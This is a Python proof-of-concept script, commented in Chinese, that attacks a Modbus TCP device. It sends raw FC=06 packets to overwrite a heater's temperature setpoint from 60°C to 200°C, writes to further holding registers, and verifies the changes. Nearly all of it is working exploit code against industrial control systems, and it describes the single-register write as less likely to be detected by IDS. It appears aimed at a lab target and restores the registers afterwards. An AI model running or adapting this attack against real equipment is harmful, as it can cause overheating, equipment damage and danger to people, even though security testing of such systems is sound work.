#!/usr/bin/env python3
"""
POC: Write Single Register - Register Address (FC=06)

验证攻击者可通过 FC=06 精确指定 Register Address，
单条请求即可篡改安全关键保持寄存器（如加热器温度设定值）。
场景：温度设定值从 60.0°C (600) 被改为 200.0°C (2000)。
"""

import socket
import struct
import time

TARGET_HOST = "172.20.0.10"
TARGET_PORT = 502
TIMEOUT = 5

SETPOINT_ADDR = 0x0064   # holding register 100 — 温度设定值
SAFE_VALUE = 600          # 60.0°C (十分之一度)
MALICIOUS_VALUE = 2000    # 200.0°C = 0x07D0


def build_fc06_request(txn_id, unit_id, reg_addr, reg_value):
    """构造 FC=06 Write Single Register 完整 Modbus TCP ADU"""
    pdu = struct.pack('>BHH', 0x06, reg_addr, reg_value)
    length = 1 + len(pdu)
    mbap = struct.pack('>HHHB', txn_id, 0x0000, length, unit_id)
    return mbap + pdu


def build_fc03_request(txn_id, unit_id, start_addr, quantity):
    """构造 FC=03 Read Holding Registers 请求"""
    pdu = struct.pack('>BHH', 0x03, start_addr, quantity)
    length = 1 + len(pdu)
    mbap = struct.pack('>HHHB', txn_id, 0x0000, length, unit_id)
    return mbap + pdu


def send_recv(sock, data, label=""):
    hex_out = ' '.join(f'{b:02x}' for b in data)
    print(f"  [TX] {label}")
    print(f"       {hex_out}")
    sock.sendall(data)
    resp = sock.recv(1024)
    hex_in = ' '.join(f'{b:02x}' for b in resp)
    print(f"  [RX] {hex_in}")
    return resp


def parse_fc06_resp(resp):
    if len(resp) < 12:
        return None, "响应过短"
    fc = resp[7]
    if fc == 0x86:
        err = {1: "ILLEGAL_FUNCTION", 2: "ILLEGAL_DATA_ADDRESS",
               3: "ILLEGAL_DATA_VALUE", 4: "SLAVE_DEVICE_FAILURE"}
        return None, f"异常: {err.get(resp[8], f'0x{resp[8]:02X}')}"
    if fc == 0x06:
        addr = struct.unpack('>H', resp[8:10])[0]
        val = struct.unpack('>H', resp[10:12])[0]
        return {"addr": addr, "value": val}, "成功"
    return None, f"未知FC: 0x{fc:02X}"


def parse_fc03_resp(resp):
    if len(resp) < 9:
        return None, "响应过短"
    fc = resp[7]
    if fc == 0x83:
        return None, f"读取异常: 0x{resp[8]:02X}"
    if fc == 0x03:
        bc = resp[8]
        vals = []
        for i in range(0, bc, 2):
            vals.append(struct.unpack('>H', resp[9+i:11+i])[0])
        return vals, "成功"
    return None, f"未知FC: 0x{fc:02X}"


def run_poc():
    print("=" * 70)
    print("POC: Write Single Register - Register Address 验证")
    print("=" * 70)
    print(f"目标: {TARGET_HOST}:{TARGET_PORT}")
    print(f"攻击寄存器: 0x{SETPOINT_ADDR:04X} (decimal {SETPOINT_ADDR})")
    print(f"安全值: {SAFE_VALUE} ({SAFE_VALUE/10:.1f}°C)")
    print(f"恶意值: {MALICIOUS_VALUE} ({MALICIOUS_VALUE/10:.1f}°C) = 0x{MALICIOUS_VALUE:04X}")
    print()

    # =============================================================
    # 阶段 1: 初始化 — 设置相邻寄存器为已知值
    # =============================================================
    print("-" * 70)
    print("阶段 1: 初始化相邻寄存器区域")
    print("-" * 70)

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(TIMEOUT)
    sock.connect((TARGET_HOST, TARGET_PORT))

    init_data = [
        (SETPOINT_ADDR - 1, 1111, "reg[99]  前一个"),
        (SETPOINT_ADDR,     SAFE_VALUE, "reg[100] 温度设定值"),
        (SETPOINT_ADDR + 1, 3333, "reg[101] 后一个"),
    ]
    for addr, val, desc in init_data:
        req = build_fc06_request(0x0001, 0x01, addr, val)
        resp = send_recv(sock, req, f"FC=06 {desc} = {val}")
        time.sleep(0.1)

    time.sleep(0.3)

    # 读取初始状态
    print("\n  读取初始状态:")
    req = build_fc03_request(0x0002, 0x01, SETPOINT_ADDR - 1, 3)
    resp = send_recv(sock, req, "FC=03 读取 reg[99..101]")
    vals, msg = parse_fc03_resp(resp)
    if vals:
        labels = ["reg[99]  (前一个)", "reg[100] (温度设定值) <<<", "reg[101] (后一个)"]
        for i, lbl in enumerate(labels):
            print(f"    {lbl} = {vals[i]}")
    sock.close()
    print()

    # =============================================================
    # 阶段 2: 核心攻击 — FC=06 精确篡改温度设定值
    # =============================================================
    print("-" * 70)
    print("阶段 2: 核心攻击 — FC=06 Register Address=0x0064, Value=0x07D0")
    print("-" * 70)

    print(f"\n  攻击报文构造 (与 POC 文档完全一致):")
    print(f"    MBAP transaction_id: 0x0001")
    print(f"    MBAP protocol_id:    0x0000")
    print(f"    MBAP length:         0x0006")
    print(f"    MBAP unit_id:        0x01")
    print(f"    PDU function_code:   0x06 (Write Single Register)")
    print(f"    PDU register_address:0x{SETPOINT_ADDR:04X}")
    print(f"    PDU register_value:  0x{MALICIOUS_VALUE:04X} ({MALICIOUS_VALUE/10:.1f}°C)")
    print()

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(TIMEOUT)
    sock.connect((TARGET_HOST, TARGET_PORT))

    req = build_fc06_request(0x0003, 0x01, SETPOINT_ADDR, MALICIOUS_VALUE)
    print("  --- 发送攻击报文 ---")
    resp = send_recv(sock, req,
        f"FC=06 addr=0x{SETPOINT_ADDR:04X}, val={MALICIOUS_VALUE} (0x{MALICIOUS_VALUE:04X})")
    result, msg = parse_fc06_resp(resp)

    attack_ok = False
    if result:
        print(f"\n  [!] 攻击成功!")
        print(f"      响应确认: 地址 0x{result['addr']:04X}, 值 0x{result['value']:04X}")
        attack_ok = True
    else:
        print(f"\n  [X] 攻击失败: {msg}")

    time.sleep(0.3)

    # 验证精确性
    print("\n  --- 验证攻击精确性 ---")
    req = build_fc03_request(0x0004, 0x01, SETPOINT_ADDR - 1, 3)
    resp = send_recv(sock, req, "FC=03 读取 reg[99..101]")
    vals, msg = parse_fc03_resp(resp)
    if vals:
        expected = [1111, MALICIOUS_VALUE, 3333]
        all_ok = True
        print(f"\n  攻击后寄存器状态:")
        for i, (exp, lbl) in enumerate(zip(expected, [
            "reg[99]  前一个",
            "reg[100] 温度设定值",
            "reg[101] 后一个"])):
            match = "✓" if vals[i] == exp else "✗"
            marker = ""
            if i == 1:
                if vals[i] == MALICIOUS_VALUE:
                    marker = (f" ← 已篡改! "
                              f"({SAFE_VALUE/10:.1f}°C→{MALICIOUS_VALUE/10:.1f}°C)")
                else:
                    all_ok = False
            else:
                if vals[i] != exp:
                    marker = " ← 意外变更!"
                    all_ok = False
            print(f"    {match} {lbl} = {vals[i]}{marker}")

        if all_ok:
            print(f"\n  [!] Register Address 精确定位确认:")
            print(f"      - 目标寄存器 0x{SETPOINT_ADDR:04X}: "
                  f"{SAFE_VALUE}→{MALICIOUS_VALUE} ({MALICIOUS_VALUE/10:.1f}°C)")
            print(f"      - 相邻寄存器: 未受影响")

    sock.close()
    print()

    # =============================================================
    # 阶段 3: FC=06 vs FC=16 — 单寄存器写入同样有效
    # =============================================================
    print("-" * 70)
    print("阶段 3: 多地址验证 — FC=06 可精确定位任意保持寄存器")
    print("-" * 70)
    print()

    test_targets = [
        (0x0000, 500,  "reg[0]   — 首地址"),
        (0x0032, 600,  "reg[50]  — 中间地址"),
        (0x0064, 700,  "reg[100] — POC 目标"),
        (0x00C8, 800,  "reg[200] — 高位地址"),
        (0x01F4, 999,  "reg[500] — 远端地址"),
    ]

    results_table = []
    txn = 0x0010

    for addr, val, desc in test_targets:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(TIMEOUT)
        try:
            sock.connect((TARGET_HOST, TARGET_PORT))

            # FC=06 写入
            req = build_fc06_request(txn, 0x01, addr, val)
            resp = send_recv(sock, req, f"FC=06 addr=0x{addr:04X}, val={val}")
            w_result, w_msg = parse_fc06_resp(resp)
            time.sleep(0.2)

            # FC=03 回读
            req = build_fc03_request(txn + 1, 0x01, addr, 1)
            resp = send_recv(sock, req, f"FC=03 读取 reg[{addr}]")
            r_vals, r_msg = parse_fc03_resp(resp)

            write_ok = w_result is not None
            read_val = r_vals[0] if r_vals else None
            match = (read_val == val) if read_val is not None else False
            results_table.append((addr, desc, val, write_ok, read_val, match))

            status = "✓" if match else "✗"
            print(f"    {status} {desc}: 写入 {val}, 回读 {read_val}")
            print()

            txn += 2
        except Exception as e:
            print(f"    ✗ {desc}: 错误 {e}")
            results_table.append((addr, desc, val, False, None, False))
        finally:
            sock.close()
            time.sleep(0.2)

    # =============================================================
    # 阶段 4: 恢复
    # =============================================================
    print("-" * 70)
    print("阶段 4: 恢复所有寄存器")
    print("-" * 70)

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(TIMEOUT)
    sock.connect((TARGET_HOST, TARGET_PORT))

    for addr, val, desc in test_targets:
        req = build_fc06_request(0x00F0, 0x01, addr, 0)
        sock.sendall(req)
        sock.recv(1024)
        time.sleep(0.1)

    for offset in [-1, 0, 1]:
        req = build_fc06_request(0x00F1, 0x01, SETPOINT_ADDR + offset, 0)
        sock.sendall(req)
        sock.recv(1024)
        time.sleep(0.1)

    print(f"  [OK] 所有寄存器已恢复为 0")
    sock.close()

    # =============================================================
    # 汇总
    # =============================================================
    print()
    print("=" * 70)
    print("验证结果汇总")
    print("=" * 70)
    print()

    print(f"  {'地址':<16} {'描述':<28} {'写入值':<8} {'回读值':<8} {'命中':<6}")
    print(f"  {'-'*16} {'-'*28} {'-'*8} {'-'*8} {'-'*6}")

    ok_count = 0
    for addr, desc, val, write_ok, read_val, match in results_table:
        rv = str(read_val) if read_val is not None else "N/A"
        m = "✓" if match else "✗"
        print(f"  0x{addr:04X} (d={addr:<4}) {desc:<28} {val:<8} {rv:<8} {m}")
        if match:
            ok_count += 1

    print()
    print(f"  测试 {len(test_targets)} 个地址，{ok_count} 个精确命中")
    print()

    if attack_ok and ok_count == len(test_targets):
        print("  [!] 安全发现: FC=06 Write Single Register 的 Register Address")
        print("      可被攻击者完全控制，单条请求即可篡改任意保持寄存器!")
        print()
        print("  [!] 攻击影响 (加热器控制场景):")
        print(f"      温度设定值: {SAFE_VALUE/10:.1f}°C → {MALICIOUS_VALUE/10:.1f}°C")
        print("      - 加热器全功率运行")
        print("      - 超过设计温度限值")
        print("      - 容器/管道热损坏风险")
        print()
        print("  [!] FC=06 vs FC=16 对比:")
        print("      FC=06 仅需 12 字节（比 FC=16 的 15+ 字节更紧凑）")
        print("      FC=06 更隐蔽 — 仅写单个寄存器，不易被 IDS 检测")
        print()
        print("  CWE 分类:")
        print("    - CWE-306: Missing Authentication for Critical Function")
        print("    - CWE-284: Improper Access Control")
        print("    - CWE-862: Missing Authorization")

    print()
    print("=" * 70)
    print("POC 验证完成")
    print("=" * 70)


if __name__ == "__main__":
    run_poc()
